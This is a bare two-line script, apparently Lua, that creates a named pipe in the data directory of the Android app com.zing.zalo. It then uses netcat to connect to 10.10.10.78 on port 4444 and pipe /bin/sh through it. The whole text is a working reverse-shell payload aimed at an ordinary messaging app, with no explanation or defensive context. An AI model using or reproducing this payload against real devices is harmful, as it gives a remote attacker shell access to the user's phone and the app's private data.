os.execute("mkfifo /data/data/com.zing.zalo/backpipe")
os.execute("nc 10.10.10.78 4444 0</data/data/com.zing.zalo/backpipe | /bin/sh 1>/data/data/com.zing.zalo/backpipe")
